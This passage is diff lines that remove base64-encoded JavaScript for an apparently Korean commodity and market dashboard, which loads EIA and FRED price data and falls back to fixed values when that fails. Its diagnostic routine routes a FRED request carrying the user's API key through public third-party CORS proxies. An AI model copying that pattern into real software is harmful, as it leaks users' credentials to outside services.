-"dmFsICsgJyBNTVQnOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZGEtc295LXN0b2NrLXly",
-"JykudGV4dENvbnRlbnQgPSAobGF0ZXN0Lm1hcmtldFllYXIgfHwgJzIwMjUnKSArICcvJyArICgobGF0",
-"ZXN0Lm1hcmtldFllYXJ8fDIwMjUpKzEpLnRvU3RyaW5nKCkuc2xpY2UoMik7CiAgfSBlbHNlIHsKICAg",
-"IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2RhLXNveS1zdG9jaycpLnRleHRDb250ZW50ID0gJzEy",
-"NC45IE1NVCc7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNkYS1zb3ktc3RvY2steXInKS50",
-"ZXh0Q29udGVudCA9ICcyMDI1LzI2ICjsiJjrj5kpJzsKICB9CiAgfSBjYXRjaChlKXsgY29uc29sZS53",
-"YXJuKCdsb2FkTWFjcm9TdHJpcCBlcnJvciAobm9uLWNyaXRpY2FsKTonLCBlKTsgfQp9CgovLyDilZDi",
-"lZDilZAgRkFMTEJBQ0sg4pWQ4pWQ4pWQCmZ1bmN0aW9uIHVwZGF0ZUFsbERhdGVzKCl7CiAgY29uc3Qg",
-"bm93ID0gbmV3IERhdGUoKTsKICBjb25zdCB5ID0gbm93LmdldEZ1bGxZZWFyKCk7CiAgY29uc3QgbSA9",
-"IFN0cmluZyhub3cuZ2V0TW9udGgoKSsxKS5wYWRTdGFydCgyLCcwJyk7CiAgY29uc3QgZCA9IFN0cmlu",
-"Zyhub3cuZ2V0RGF0ZSgpKS5wYWRTdGFydCgyLCcwJyk7CiAgY29uc3QgaCA9IFN0cmluZyhub3cuZ2V0",
-"SG91cnMoKSkucGFkU3RhcnQoMiwnMCcpOwogIGNvbnN0IG1pID0gU3RyaW5nKG5vdy5nZXRNaW51dGVz",
-"KCkpLnBhZFN0YXJ0KDIsJzAnKTsKICBjb25zdCBkYXRlU3RyID0gYCR7eX0uJHttfS4ke2R9YDsKICBj",
-"b25zdCBkYXRlVGltZVN0ciA9IGAke3l9LiR7bX0uJHtkfSAke2h9OiR7bWl9IEtTVGA7CgogIC8vIOyD",
-"geuLqCDtl6Trk5zrnbzsnbgg6riw7KSA7J28CiAgY29uc3QgaGQgPSBkb2N1bWVudC5nZXRFbGVtZW50",
-"QnlJZCgnaGVhZGxpbmUtZGF0ZScpOwogIGlmKGhkKSBoZC50ZXh0Q29udGVudCA9IGDquLDspIDsnbw6",
-"ICR7ZGF0ZVRpbWVTdHJ9IHwg67Cp6riIIOyXheuNsOydtO2KuGA7CgogIC8vIOqwgSDsooXrqqkgcGgt",
-"bGFiZWwgKOq4sOykgOydvCDrkqTsl5Ag64Kg7KecIOyCveyehSkKICBjb25zdCBsYmxNYXAgPSB7CiAg",
-"ICAnbGJsLW9pbCc6ICAgICdOWU1FWCDCtyBXVEkg7JuQ7JygIO2YhOusvOqwgCcsCiAgICAnbGJsLWdh",
-"cyc6ICAgICdFSUEgwrcgTkcuUk5HV0hIRC5EIMK3IOyynOyXsOqwgOyKpCDtmITrrLzqsIAnLAogICAg",
-"J2xibC1nb2xkJzogICAnRlJFRCDCtyBHT0xEQU1HQkQyMjhOTEJNIMK3IOufsOuNmCDqs6DsoJXqsIAn",
-"LAogICAgJ2xibC1zcDUwMCc6ICAnRlJFRCDCtyBTUDUwMCDCtyBEYWlseScsCiAgICAnbGJsLXQxMHkn",
-"OiAgICdGUkVEIMK3IERHUzEwIMK3IERhaWx5JywKICAgICdsYmwtYXVkJzogICAgJ0ZSRUQgwrcgREVY",
-"VVNBTCDCtyBEYWlseScsCiAgICAnbGJsLXNveSc6ICAgICdGUkVEIMK3IFBTT1lCVVNETSDCtyBNb250",
-"aGx5JywKICAgICdsYmwtbmFzZGFxJzogJ0ZSRUQgwrcgTkFTREFRMTAwIMK3IERhaWx5JywKICAgICds",
-"YmwtZXVyb2Z4JzogJ0ZSRUQgwrcgREVYVVNFVSDCtyBEYWlseScsCiAgICAnbGJsLWpweSc6ICAgICdG",
-"UkVEIMK3IERFWEpQVVMgwrcgRGFpbHknLAogICAgJ2xibC1jb3JuJzogICAnRlJFRCDCtyBQTUFJWk1U",
-"VVNETSDCtyBNb250aGx5JywKICAgICdsYmwtd2hlYXQnOiAgJ0ZSRUQgwrcgUFdIRUFNVFVTRE0gwrcg",
-"TW9udGhseScKICB9OwogIE9iamVjdC5lbnRyaWVzKGxibE1hcCkuZm9yRWFjaCgoW2lkLCBiYXNlXSkg",
-"PT4gewogICAgY29uc3QgZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7CiAgICBpZihlbCkg",
-"ZWwudGV4dENvbnRlbnQgPSBgJHtiYXNlfSAoJHtkYXRlU3RyfSDquLDspIApYDsKICB9KTsKCiAgLy8g",
-"YWxlcnQg67Cw64SIIOuCoOynnCBzcGFuCiAgWydvaWwnLCdnYXMnLCdnb2xkJywnc3A1MDAnXS5mb3JF",
-"YWNoKGlkID0+IHsKICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FsZXJ0LWRh",
-"dGUtJytpZCk7CiAgICBpZihlbCkgZWwudGV4dENvbnRlbnQgPSBkYXRlU3RyOwogIH0pOwp9CgpmdW5j",
-"dGlvbiB1cGRhdGVIZWFkbGluZURhdGUoKXsgdXBkYXRlQWxsRGF0ZXMoKTsgfQoKZnVuY3Rpb24gYXBw",
-"bHlGYWxsYmFjaygpewogIGNvbnN0IHNldD0oaWQsdixwLHUsZCk9Pnt1cGRhdGVOYXYoaWQsdixwLHUs",
-"ZCk7Y29uc3QgZWw9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQrJy1wcmljZScpO2lmKGVsKWVsLnRl",
-"eHRDb250ZW50PXYudG9GaXhlZChkPz8yKSsodSYmdSE9J2JibCcmJnUhPSdveicmJnUhPSdtdCc/Jyc6",
-"JycpfQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvaWwtcHJpY2UnKS50ZXh0Q29udGVudD1GQi5v",
-"aWwudi50b0ZpeGVkKDIpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdnYXMtcHJpY2UnKS50ZXh0",
-"Q29udGVudD1GQi5nYXMudi50b0ZpeGVkKDIpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdnb2xk",
-"LXByaWNlJykudGV4dENvbnRlbnQ9RkIuZ29sZC52LnRvRml4ZWQoMCkucmVwbGFjZSgvXEIoPz0oXGR7",
-"M30pKyg/IVxkKSkvZywnLCcpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzcDUwMC1wcmljZScp",
-"LnRleHRDb250ZW50PUZCLnNwNTAwLnYudG9Mb2NhbGVTdHJpbmcoKTsKICBkb2N1bWVudC5nZXRFbGVt",
-"ZW50QnlJZCgndDEweS1wcmljZScpLnRleHRDb250ZW50PUZCLnQxMHkudi50b0ZpeGVkKDIpOwogIGRv",
-"Y3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdWQtcHJpY2UnKS50ZXh0Q29udGVudD1GQi5hdWQudi50b0Zp",
-"eGVkKDQpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzb3ktcHJpY2UnKS50ZXh0Q29udGVudD1G",
-"Qi5zb3kudi50b0ZpeGVkKDApOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdnb2xkLXJhdGlvJyku",
-"dGV4dENvbnRlbnQ9KEZCLmdvbGQudi9GQi5vaWwudikudG9GaXhlZCgxKTsKICBkb2N1bWVudC5nZXRF",
-"bGVtZW50QnlJZCgnbmFzZGFxLXByaWNlJykudGV4dENvbnRlbnQ9RkIubmFzZGFxLnYudG9Mb2NhbGVT",
-"dHJpbmcoKTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXVyb2Z4LXByaWNlJykudGV4dENvbnRl",
-"bnQ9RkIuZXVyb2Z4LnYudG9GaXhlZCg0KTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnanB5LXBy",
-"aWNlJykudGV4dENvbnRlbnQ9RkIuanB5LnYudG9GaXhlZCgxKTsKICBkb2N1bWVudC5nZXRFbGVtZW50",
-"QnlJZCgnY29ybi1wcmljZScpLnRleHRDb250ZW50PUZCLmNvcm4udi50b0ZpeGVkKDApOwogIGRvY3Vt",
-"ZW50LmdldEVsZW1lbnRCeUlkKCd3aGVhdC1wcmljZScpLnRleHRDb250ZW50PUZCLndoZWF0LnYudG9G",
-"aXhlZCgwKTsKICB1cGRhdGVOYXYoJ29pbCcsRkIub2lsLnYsRkIub2lsLnAsJ2JibCcsMik7CiAgdXBk",
-"YXRlTmF2KCdnYXMnLEZCLmdhcy52LEZCLmdhcy5wLCdNTUJ0dScsMik7CiAgdXBkYXRlTmF2KCdnb2xk",
-"JyxGQi5nb2xkLnYsRkIuZ29sZC5wLCdveicsMCk7CiAgdXBkYXRlTmF2KCdzcDUwMCcsRkIuc3A1MDAu",
-"dixGQi5zcDUwMC5wLCcnLDApOwogIHVwZGF0ZU5hdigndDEweScsRkIudDEweS52LEZCLnQxMHkucCwn",
-"JScsMik7CiAgdXBkYXRlTmF2KCdhdWQnLEZCLmF1ZC52LEZCLmF1ZC5wLCcnLDQpOwogIHVwZGF0ZU5h",
-"dignc295JyxGQi5zb3kudixGQi5zb3kucCwnbXQnLDApOwogIHVwZGF0ZU5hdignbmFzZGFxJyxGQi5u",
-"YXNkYXEudixGQi5uYXNkYXEucCwnJywwKTsKICB1cGRhdGVOYXYoJ2V1cm9meCcsRkIuZXVyb2Z4LnYs",
-"RkIuZXVyb2Z4LnAsJycsNCk7CiAgdXBkYXRlTmF2KCdqcHknLEZCLmpweS52LEZCLmpweS5wLCcnLDEp",
-"OwogIHVwZGF0ZU5hdignY29ybicsRkIuY29ybi52LEZCLmNvcm4ucCwnbXQnLDApOwogIHVwZGF0ZU5h",
-"dignd2hlYXQnLEZCLndoZWF0LnYsRkIud2hlYXQucCwnbXQnLDApOwogIHNldFN0YXR1cygnZXJyb3In",
-"LCdBUEkg66+47Jew6rKwIOKAlCDsiJjrj5kg642w7J207YSwJyk7CiAgdXBkYXRlSGVhZGxpbmVEYXRl",
-"KCk7Cn0KCi8vIOKVkOKVkOKVkCBMT0FEIOKVkOKVkOKVkAphc3luYyBmdW5jdGlvbiBsb2FkQWxsRGF0",
-"YSgpewogIHNldFN0YXR1cygnbG9hZGluZycsJ+uNsOydtO2EsCDrtojrn6zsmKTripQg7KSRLi4uJyk7",
-"CiAgY29uc3QgaGFzRUlBPSEhZ2V0S2V5KCdFSUEnKSxoYXNGUkVEPSEhZ2V0S2V5KCdGUkVEJyk7CiAg",
-"aWYoIWhhc0VJQSYmIWhhc0ZSRUQpe2FwcGx5RmFsbGJhY2soKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJ",
-"ZCgnbm90aWNlLWZhbGxiYWNrJykuY2xhc3NMaXN0LmFkZCgnc2hvdycpO2J1aWxkQWxsQ2hhcnRzKGN1",
-"ckFzc2V0KTtyZXR1cm59CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vdGljZS1mYWxsYmFjaycp",
-"LmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsKICBsZXQgbGl2ZT0wOwogIGlmKGhhc0VJQSl7CiAgICBj",
-"b25zdCBkYj1hd2FpdCBmZXRjaEVJQSgnUEVULlJXVEMuRCcsJ2RhaWx5Jyk7CiAgICBpZihkYiYmZGIu",
-"bGVuZ3RoPj0yKXtjb25zdCBjPXBhcnNlRmxvYXQoZGJbMF0udmFsdWUpLHA9cGFyc2VGbG9hdChkYlsx",
-"XS52YWx1ZSk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29pbC1wcmljZScpLnRleHRDb250ZW50PWMu",
-"dG9GaXhlZCgyKTt1cGRhdGVOYXYoJ29pbCcsYyxwLCdiYmwnLDIpO2NvbnN0IHM9ZGIuc2xpY2UoMCwy",
-"MCkucmV2ZXJzZSgpO21rQ2FuZGxlKCdvaWwtY2hhcnQnLHMubWFwKHg9PngucGVyaW9kLnNsaWNlKDUp",
-"KSxzLm1hcCh4PT5wYXJzZUZsb2F0KHgudmFsdWUpKSwnIzAwZDFmZicsJyQvYmJsJyk7bGl2ZSsrfWVs",
-"c2V7YXBwbHlPaWxGQigpfQogICAgY29uc3QgZGc9YXdhaXQgZmV0Y2hFSUEoJ05HLlJOR1dISEQuRCcs",
-"J2RhaWx5Jyk7CiAgICBpZihkZyYmZGcubGVuZ3RoPj0yKXtjb25zdCBjPXBhcnNlRmxvYXQoZGdbMF0u",
-"dmFsdWUpLHA9cGFyc2VGbG9hdChkZ1sxXS52YWx1ZSk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2dh",
-"cy1wcmljZScpLnRleHRDb250ZW50PWMudG9GaXhlZCgyKTt1cGRhdGVOYXYoJ2dhcycsYyxwLCdNTUJ0",
-"dScsMik7bGl2ZSsrfQogIH1lbHNle2FwcGx5T2lsRkIoKX0KICBpZihoYXNGUkVEKXsKICAgIGNvbnN0",
-"IGRzPWF3YWl0IGZldGNoRlJFRCgnU1A1MDAnLDEwKTsKICAgIGlmKGRzJiZkcy5sZW5ndGg+PTIpe2Nv",
-"bnN0IGM9cGFyc2VGbG9hdChkc1swXS52YWx1ZSkscD1wYXJzZUZsb2F0KGRzWzFdLnZhbHVlKTtkb2N1",
-"bWVudC5nZXRFbGVtZW50QnlJZCgnc3A1MDAtcHJpY2UnKS50ZXh0Q29udGVudD1jLnRvTG9jYWxlU3Ry",
-"aW5nKCk7dXBkYXRlTmF2KCdzcDUwMCcsYyxwLCcnLDApO2lmKGN1ckFzc2V0PT09J3NwNTAwJyl7Y29u",
-"c3Qgcj1kcy5zbGljZSgwLDEwKS5yZXZlcnNlKCk7bWtDYW5kbGUoJ3NwNTAwLWNoYXJ0JyxyLm1hcCh4",
-"PT54LmRhdGUuc2xpY2UoNSkpLHIubWFwKHg9PnBhcnNlRmxvYXQoeC52YWx1ZSkpLCcjMDBjODk2Jywn",
-"Jyl9bGl2ZSsrfQogICAgY29uc3QgZGc9YXdhaXQgZmV0Y2hGUkVEKCdHT0xEQU1HQkQyMjhOTEJNJywx",
-"MCk7CiAgICBpZihkZyYmZGcubGVuZ3RoPj0yKXtjb25zdCBjPXBhcnNlRmxvYXQoZGdbMF0udmFsdWUp",
-"LHA9cGFyc2VGbG9hdChkZ1sxXS52YWx1ZSk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2dvbGQtcHJp",
-"Y2UnKS50ZXh0Q29udGVudD1jLnRvRml4ZWQoMCkucmVwbGFjZSgvXEIoPz0oXGR7M30pKyg/IVxkKSkv",
-"ZywnLCcpO3VwZGF0ZU5hdignZ29sZCcsYyxwLCdveicsMCk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQo",
-"J2dvbGQtcmF0aW8nKS50ZXh0Q29udGVudD0oYy8ocGFyc2VGbG9hdChkb2N1bWVudC5nZXRFbGVtZW50",
-"QnlJZCgnb2lsLXByaWNlJykudGV4dENvbnRlbnQpfHxGQi5vaWwudikpLnRvRml4ZWQoMSk7bGl2ZSsr",
-"fQogICAgY29uc3QgZHQ9YXdhaXQgZmV0Y2hGUkVEKCdER1MxMCcsMTApOwogICAgaWYoZHQmJmR0Lmxl",
-"bmd0aD49Mil7Y29uc3QgYz1wYXJzZUZsb2F0KGR0WzBdLnZhbHVlKSxwPXBhcnNlRmxvYXQoZHRbMV0u",
-"dmFsdWUpO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0MTB5LXByaWNlJykudGV4dENvbnRlbnQ9Yy50",
-"b0ZpeGVkKDIpO3VwZGF0ZU5hdigndDEweScsYyxwLCclJywyKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJ",
-"ZCgnc3A1MDAtdDEweScpLnRleHRDb250ZW50PWMudG9GaXhlZCgyKSsnJSc7bGl2ZSsrfQogICAgY29u",
-"c3QgZGE9YXdhaXQgZmV0Y2hGUkVEKCdERVhVU0FMJywxMCk7CiAgICBpZihkYSYmZGEubGVuZ3RoPj0y",
-"KXtjb25zdCBjPXBhcnNlRmxvYXQoZGFbMF0udmFsdWUpLHA9cGFyc2VGbG9hdChkYVsxXS52YWx1ZSk7",
-"ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F1ZC1wcmljZScpLnRleHRDb250ZW50PWMudG9GaXhlZCg0",
-"KTt1cGRhdGVOYXYoJ2F1ZCcsYyxwLCcnLDQpO2xpdmUrK30KICAgIGNvbnN0IGR5PWF3YWl0IGZldGNo",
-"RlJFRCgnUFNPWUJVU0RNJyw2KTsKICAgIGlmKGR5JiZkeS5sZW5ndGg+PTIpe2NvbnN0IGM9cGFyc2VG",
-"bG9hdChkeVswXS52YWx1ZSkscD1wYXJzZUZsb2F0KGR5WzFdLnZhbHVlKTtkb2N1bWVudC5nZXRFbGVt",
-"ZW50QnlJZCgnc295LXByaWNlJykudGV4dENvbnRlbnQ9Yy50b0ZpeGVkKDApO3VwZGF0ZU5hdignc295",
-"JyxjLHAsJ210JywwKTtsaXZlKyt9CiAgICAvLyDilIDilIAg7Iug6recIDXqsJwg7J6Q7IKwIEZSRUQg",
-"7Jew64+ZIOKUgOKUgAogICAgY29uc3QgZG49YXdhaXQgZmV0Y2hGUkVEKCdOQVNEQVFDT00nLDEwKTsK",
-"ICAgIGlmKGRuJiZkbi5sZW5ndGg+PTIpe2NvbnN0IGM9cGFyc2VGbG9hdChkblswXS52YWx1ZSkscD1w",
-"YXJzZUZsb2F0KGRuWzFdLnZhbHVlKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFzZGFxLXByaWNl",
-"JykudGV4dENvbnRlbnQ9Yy50b0xvY2FsZVN0cmluZygpO3VwZGF0ZU5hdignbmFzZGFxJyxjLHAsJycs",
-"MCk7bGl2ZSsrfQogICAgY29uc3QgZGU9YXdhaXQgZmV0Y2hGUkVEKCdERVhVU0VVJywxMCk7CiAgICBp",
-"ZihkZSYmZGUubGVuZ3RoPj0yKXtjb25zdCBjPXBhcnNlRmxvYXQoZGVbMF0udmFsdWUpLHA9cGFyc2VG",
-"bG9hdChkZVsxXS52YWx1ZSk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2V1cm9meC1wcmljZScpLnRl",
-"eHRDb250ZW50PWMudG9GaXhlZCg0KTt1cGRhdGVOYXYoJ2V1cm9meCcsYyxwLCcnLDQpO2xpdmUrK30K",
-"ICAgIGNvbnN0IGRqPWF3YWl0IGZldGNoRlJFRCgnREVYSlBVUycsMTApOwogICAgaWYoZGomJmRqLmxl",
-"bmd0aD49Mil7Y29uc3QgYz1wYXJzZUZsb2F0KGRqWzBdLnZhbHVlKSxwPXBhcnNlRmxvYXQoZGpbMV0u",
-"dmFsdWUpO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdqcHktcHJpY2UnKS50ZXh0Q29udGVudD1jLnRv",
-"Rml4ZWQoMSk7dXBkYXRlTmF2KCdqcHknLGMscCwnJywxKTtsaXZlKyt9CiAgICBjb25zdCBkYz1hd2Fp",
-"dCBmZXRjaEZSRUQoJ1BNQUlaTVRVU0RNJyw2KTsKICAgIGlmKGRjJiZkYy5sZW5ndGg+PTIpe2NvbnN0",
-"IGM9cGFyc2VGbG9hdChkY1swXS52YWx1ZSkscD1wYXJzZUZsb2F0KGRjWzFdLnZhbHVlKTtkb2N1bWVu",
-"dC5nZXRFbGVtZW50QnlJZCgnY29ybi1wcmljZScpLnRleHRDb250ZW50PWMudG9GaXhlZCgwKTt1cGRh",
-"dGVOYXYoJ2Nvcm4nLGMscCwnbXQnLDApO2xpdmUrK30KICAgIGNvbnN0IGR3PWF3YWl0IGZldGNoRlJF",
-"RCgnUFdIRUFNVFVTRE0nLDYpOwogICAgaWYoZHcmJmR3Lmxlbmd0aD49Mil7Y29uc3QgYz1wYXJzZUZs",
-"b2F0KGR3WzBdLnZhbHVlKSxwPXBhcnNlRmxvYXQoZHdbMV0udmFsdWUpO2RvY3VtZW50LmdldEVsZW1l",
-"bnRCeUlkKCd3aGVhdC1wcmljZScpLnRleHRDb250ZW50PWMudG9GaXhlZCgwKTt1cGRhdGVOYXYoJ3do",
-"ZWF0JyxjLHAsJ210JywwKTtsaXZlKyt9CiAgfQogIGJ1aWxkQWxsQ2hhcnRzKGN1ckFzc2V0KTsKICB1",
-"cGRhdGVIZWFkbGluZURhdGUoKTsKICBpZihsaXZlPjApewogICAgc2V0U3RhdHVzKCcnLGDsi6Tsi5zq",
-"sIQgwrcgJHtsaXZlfeqwnCDshozsiqQg7Jew6rKwYCk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJ",
-"ZCgnbm90aWNlLWZhbGxiYWNrJykuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOwogIH0gZWxzZSB7CiAg",
-"ICAvLyDtgqTripQg7J6I7KeA66eMIEFQSSDsnZHri7Ug7Iuk7YyoIOKGkiDsg4HshLgg7JWI64K0CiAg",
-"ICBzZXRTdGF0dXMoJ2Vycm9yJywnQVBJIOydkeuLtSDsl4bsnYwg4oCUIOy9mOyGlChGMTIpIO2Zleyd",
-"uCcpOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vdGljZS1mYWxsYmFjaycpLmNsYXNzTGlz",
-"dC5hZGQoJ3Nob3cnKTsKICAgIGNvbnNvbGUud2Fybign66qo65OgIEFQSSDsnZHri7Ug7Iuk7YyoLiDt",
-"gqQg7ZmV7J24IOuYkOuKlCBDT1JTIOydtOyKiOydvCDsiJgg7J6I7Iq164uI64ukLicpOwogIH0KfQpm",
-"dW5jdGlvbiBhcHBseU9pbEZCKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29pbC1wcmljZScpLnRl",
-"eHRDb250ZW50PUZCLm9pbC52LnRvRml4ZWQoMik7dXBkYXRlTmF2KCdvaWwnLEZCLm9pbC52LEZCLm9p",
-"bC5wLCdiYmwnLDIpO30KCi8vIOKVkOKVkOKVkCBBUEkg7KeE64uoIOKVkOKVkOKVkAphc3luYyBmdW5j",
-"dGlvbiBkaWFnQVBJKCl7CiAgY29uc3QgZWlhS2V5PWdldEtleSgnRUlBJyk7CiAgY29uc3QgZnJlZEtl",
-"eT1nZXRLZXkoJ0ZSRUQnKTsKICBsZXQgbXNnID0gJ+KVkOKVkOKVkCBBUEkg7KeE64uoIOqysOqzvCDi",
-"lZDilZDilZBcblxuJzsKICBtc2cgKz0gYEVJQSDtgqQ6ICR7ZWlhS2V5ID8gJ+KchSDsnoXroKXrkKgg",
-"KOq4uOydtDonK2VpYUtleS5sZW5ndGgrJyknIDogJ+KdjCDsl4bsnYwnfVxuYDsKICBtc2cgKz0gYEZS",
-"RUQg7YKkOiAke2ZyZWRLZXkgPyAn4pyFIOyeheugpeuQqCAo6ri47J20OicrZnJlZEtleS5sZW5ndGgr",
-"JyknIDogJ+KdjCDsl4bsnYwnfVxuXG5gOwoKICBpZihmcmVkS2V5KXsKICAgIGNvbnN0IGZyZWRVcmw9",
-"YGh0dHBzOi8vYXBpLnN0bG91aXNmZWQub3JnL2ZyZWQvc2VyaWVzL29ic2VydmF0aW9ucz9zZXJpZXNf",
-"aWQ9U1A1MDAmYXBpX2tleT0ke2ZyZWRLZXl9JmZpbGVfdHlwZT1qc29uJnNvcnRfb3JkZXI9ZGVzYyZs",
-"aW1pdD0yYDsKICAgIC8vIOyngeygkSDsi5zrj4QKICAgIGxldCBmcmVkT2s9ZmFsc2U7CiAgICB0cnl7",
-"CiAgICAgIGNvbnN0IHI9YXdhaXQgZmV0Y2goZnJlZFVybCk7Y29uc3Qgaj1hd2FpdCByLmpzb24oKTsK",
-"ICAgICAgaWYoaj8ub2JzZXJ2YXRpb25zPy5sZW5ndGg+MCl7bXNnKz1g4pyFIEZSRUQg7KeB7KCRIOyX",
-"sOqysCDshLHqs7UhIFNQNTAwOiAke2oub2JzZXJ2YXRpb25zWzBdLnZhbHVlfVxuYDtmcmVkT2s9dHJ1",
-"ZTt9CiAgICAgIGVsc2UgaWYoaj8uZXJyb3JfbWVzc2FnZSl7bXNnKz1g4p2MIEZSRUQg7YKkIOyYpOul",
-"mDogJHtqLmVycm9yX21lc3NhZ2V9XG5gO30KICAgIH1jYXRjaChlKXt9CiAgICAvLyDtlITroZ3si5wg",
-"7Iuc64+ECiAgICBpZighZnJlZE9rKXsKICAgICAgbXNnKz0nRlJFRCDsp4HsoJEg7Iuk7YyoIOKGkiDt",
-"lITroZ3si5wg7Iuc64+EIOykkS4uLlxuJzsKICAgICAgY29uc3QgcHJveGllcz1bCiAgICAgICAgWydh",
-"bGxvcmlnaW5zJyxgaHR0cHM6Ly9hcGkuYWxsb3JpZ2lucy53aW4vcmF3P3VybD0ke2VuY29kZVVSSUNv",
-"bXBvbmVudChmcmVkVXJsKX1gXSwKICAgICAgICBbJ2NvcnNwcm94eS5pbycsYGh0dHBzOi8vY29yc3By",
-"b3h5LmlvLz8ke2VuY29kZVVSSUNvbXBvbmVudChmcmVkVXJsKX1gXQogICAgICBdOwogICAgICBmb3Io",
-"Y29uc3QgW25hbWUscF0gb2YgcHJveGllcyl7CiAgICAgICAgdHJ5ewogICAgICAgICAgY29uc3Qgcj1h",
-"d2FpdCBmZXRjaChwKTtjb25zdCBqPWF3YWl0IHIuanNvbigpOwogICAgICAgICAgaWYoaj8ub2JzZXJ2",
-"YXRpb25zPy5sZW5ndGg+MCl7bXNnKz1g4pyFIEZSRUQgWyR7bmFtZX1dIO2UhOuhneyLnCDshLHqs7Uh",
-"IFNQNTAwOiAke2oub2JzZXJ2YXRpb25zWzBdLnZhbHVlfVxuYDtmcmVkT2s9dHJ1ZTticmVhazt9CiAg",
-"ICAgICAgfWNhdGNoKGUpe21zZys9YOKdjCBbJHtuYW1lfV0g7Iuk7YyoXG5gO30KICAgICAgfQogICAg",
-"ICBpZighZnJlZE9rKSBtc2crPSfihpIg66qo65OgIOuwqeuylSDsi6TtjKguIE5ldGxpZnkg67Cw7Y+s",
-"IO2bhCDsgqzsmqkg6raM7J6lXG4nOwogICAgfQogIH0KCiAgaWYoZWlhS2V5KXsKICAgIG1zZys9J1xu",
-"RUlBIOyXsOqysCDthYzsiqTtirgg7KSRLi4uXG4nOwogICAgdHJ5ewogICAgICBjb25zdCByPWF3YWl0",
-"IGZldGNoKGBodHRwczovL2FwaS5laWEuZ292L3YyL3Nlcmllc2lkL1BFVC5SV1RDLkQ/YXBpX2tleT0k",
-"e2VpYUtleX0mZGF0YVswXT12YWx1ZSZzb3J0WzBdW2NvbHVtbl09cGVyaW9kJnNvcnRbMF1bZGlyZWN0",
-"aW9uXT1kZXNjJm9mZnNldD0wJmxlbmd0aD0yJmZyZXF1ZW5jeT1kYWlseWApOwogICAgICBjb25zdCBq",
-"PWF3YWl0IHIuanNvbigpOwogICAgICBpZihqPy5yZXNwb25zZT8uZGF0YT8ubGVuZ3RoPjApe21zZys9",
-"YOKchSBFSUEg7Jew6rKwIOyEseqztSEgV1RJOiAke2oucmVzcG9uc2UuZGF0YVswXS52YWx1ZX1cbmA7",
-"fQogICAgICBlbHNle21zZys9YOKdjCBFSUEg7Jik66WYOiAke0pTT04uc3RyaW5naWZ5KGopLnNsaWNl",
-"KDAsMTAwKX1cbmA7fQogICAgfWNhdGNoKGUpe21zZys9YOKdjCBFSUEg64Sk7Yq47JuM7YGsIOyYpOul",
-"mDogJHtlLm1lc3NhZ2V9XG5gO30KICB9CgogIGFsZXJ0KG1zZyk7Cn0KCi8vIOKVkOKVkOKVkCBTRUFT",
-"T04gQkFSIEdSQURJRU5UIOKVkOKVkOKVkApmdW5jdGlvbiBhcHBseVNlYXNvbkJhckdyYWRpZW50KCl7",
-"CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLnNiLWJhcicpLmZvckVhY2goYmFyPT57CiAgICBj",
-"b25zdCB3PXBhcnNlSW50KGJhci5zdHlsZS53aWR0aCl8fDA7CiAgICAvLyDrhIjruYQg67mE66GAIOu2",
-"ieydgCDqt7jrnbzrjbDsnbTshZg6IOuEk+ydhOyImOuhnSDsp4TtlZwg67mo6rCVLCDsooHsnYTsiJjr",
-"oZ0g7Jew7ZWcIOu2hO2ZjQogICAgLy8gdzogMjV+MTAwIOKGkiDsg4nsg4Eg66ek7ZWRCiAgICBjb25z",
-"dCB0PU1hdGgubWF4KDAsTWF0aC5taW4oMSwody0yNSkvNzUpKTsgLy8gMH4xIOygleq3nO2ZlAogICAg",
-"Y29uc3Qgcj1NYXRoLnJvdW5kKDIyMC10KjApOyAgIC8vIFI6IDIyMCDqs6DsoJUKICAgIGNvbnN0IGc9",
-"TWF0aC5yb3VuZCgxNjAtdCoxMTApOyAvLyBHOiAxNjDihpI1MAogICAgY29uc3QgYj1NYXRoLnJvdW5k",
-"KDE2MC10KjExMCk7IC8vIEI6IDE2MOKGkjUwCiAgICBiYXIuc3R5bGUuYmFja2dyb3VuZD1gcmdiKCR7",
-"cn0sJHtnfSwke2J9KWA7CiAgfSk7Cn0KLy8g4pWQ4pWQ4pWQIFNPVVJDRSBMSU5LUyDilZDilZDilZAK",
-"ZnVuY3Rpb24gYWRkU291cmNlTGlua3MoKXsKICBjb25zdCBtYXA9ewogICAgJ3BhZ2Utb2lsJzogICAg",
-"e2xhYmVsOidFSUEgU1RFTycsICAgICAgICAgIHVybDonaHR0cHM6Ly93d3cuZWlhLmdvdi9vdXRsb29r",
